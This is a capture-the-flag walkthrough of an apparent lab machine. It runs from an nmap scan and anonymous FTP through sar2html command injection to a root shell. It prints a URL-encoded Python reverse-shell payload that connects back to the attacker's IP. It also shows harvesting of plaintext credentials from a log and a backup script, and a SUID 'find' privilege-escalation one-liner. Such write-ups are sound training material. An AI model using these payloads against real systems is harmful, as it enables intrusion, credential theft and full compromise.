## MACHINE IP
```bash
10.201.30.166
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Sun Oct  5 19:35:23 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.30.166
Nmap scan report for 10.201.30.166
Host is up (0.29s latency).
Not shown: 65530 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.80.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: E33101A2BD908AE2A43CBAEB3231F076
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  5 19:36:51 2025 -- 1 IP address (1 host up) scanned in 88.25 seconds
```
## OPEN PORTS - ANALYSIS
```bash
21/tcp    open  ftp     vsftpd 3.0.3
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```
## RECON
```bash
# Operating System                                // Found Post Initial Foothold
cat /etc/*-release      
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"

# Credentials                                   // Found Post Initial Foothold
basterd:superduperp@$$
stoner:superduperp@$$no1knows
```
## ENUMERATION
```bash
# PORT 21 FTP 
- Checking anonymous access
  
sudo ftp ftp://anonymous:anonymous@$ip
Connected to 10.201.30.166.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls -la
229 Entering Extended Passive Mode (|||47664|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||48474|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |************************************************************************************************************************************************|    74       14.96 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (0.24 KiB/s)
ftp> quit
221 Goodbye.

cat .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!

- cyberchef - ROT13 
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!

- http://10.201.30.166/robots.txt
/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075

- Cyberchef > Decimal to Text > Base64 Decode > Crack the MD5 hash using crackstation.com
99b0660cd95adea327c54182baa51584:kidding

- Fuzzing 
sudo feroxbuster -w /usr/share/wordlists/dirb/common.txt -C 404 -o fuzz/feroxbuster-common.txt -t 20 -u $url/

- Found sar2html on http://10.201.30.166/joomla/_test/

# Exploit
https://www.exploit-db.com/exploits/47204
In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```
## INITIAL SHELL
```bash
- Start Listener 

- Reverse shell
http://10.201.30.166/joomla/_test/index.php?plot=LINUX;python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.13.80.25%22,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27

sudo nc -nvlp 80
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.30.166] 41374                            
$ id                                                                                          
id                                                                                            
uid=33(www-data) gid=33(www-data) groups=33(www-data)      
```
## PRIVILEGE ESCALATION
```bash
ww-data@Vulnerable:/var/www/html/joomla/_test$ ll                
total 124K                                                                                    
4.0K drwxr-xr-x  3 www-data www-data 4.0K Aug 22  2019 sarFILE    
4.0K drwxr-xr-x  3 www-data www-data 4.0K Aug 22  2019 .
56K -rwxr-xr-x  1 www-data www-data  53K Aug 22  2019 index.php
4.0K drwxr-xr-x 25 www-data www-data 4.0K Aug 22  2019 ..
4.0K -rwxr-xr-x  1 www-data www-data  716 Aug 21  2019 log.txt                           
52K -rwxr-xr-x  1 www-data www-data  52K Mar 19  2019 sar2html                               
www-data@Vulnerable:/var/www/html/joomla/_test$ less log.txt                                  
www-data@Vulnerable:/var/www/html/joomla/_test$ cat log.txt    
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.                            
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest    
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.        

# Credentials
basterd:superduperp@$$

- Use the creds to login via ssh as user basterd

$ ls -la                                                                                                                                                                      21:18:52 [5/48]
total 16                                                                                      
drwxr-x--- 3 basterd basterd 4096 Aug 22  2019 . 
drwxr-xr-x 4 root    root    4096 Aug 22  2019 ..       
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh    
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4096 Aug 22  2019 .cache
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
  
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
      

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
  
- Found More creds
stoner:superduperp@$$no1knows

su stoner

# Privesc
SUID
find / -perm -u=s -type f 2>/dev/null

- Found /usr/bin/find
```
## ROOT | ADMINISTRATOR - PWNED
```bash
stoner@Vulnerable:/tmp$ /usr/bin/find . -exec /bin/sh -p \; -quit
# id
uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
# whoami
root                         
```
